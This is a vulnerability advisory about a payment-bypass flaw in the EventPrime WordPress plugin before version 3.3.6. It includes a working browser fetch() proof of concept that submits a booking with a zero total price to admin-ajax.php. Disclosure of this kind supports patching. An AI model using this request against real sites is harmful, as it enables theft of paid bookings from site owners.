## WordPress Plugin Vulnerabilities

# EventPrime < 3.3.6 - Booking Pricing Bypass

### Description

The plugin specifies the price of a booking in the client request, allowing an attacker to purchase bookings without payment.

### Proof of Concept

Create an Event, noting its ID. Add a ticket type to the Event, ensuring that the price is not zero.
As a logged-in user, go through the process of paying for an event booking until the "Select Payment Method" page. Then run the following code in the browser (replacing EVENT\_ID) and note that a booking has been created without payment.
await (await fetch("/wp-admin/admin-ajax.php", {
"credentials": "include",
"headers": {
"Content-Type": "application/x-www-form-urlencoded",
},
"body": "action=ep\_save\_event\_booking&data=ep\_event\_booking\_event\_id%3DEVENT\_ID%26ep\_event\_booking\_user\_id%3D1%26ep\_event\_booking\_total\_price%3D0%26ep\_event\_booking\_total\_tickets%3D1%26ep\_save\_event\_booking\_nonce%3D" + document.querySelector("[name=ep\_save\_event\_booking\_nonce]").value ,
"method": "POST",
})).text();
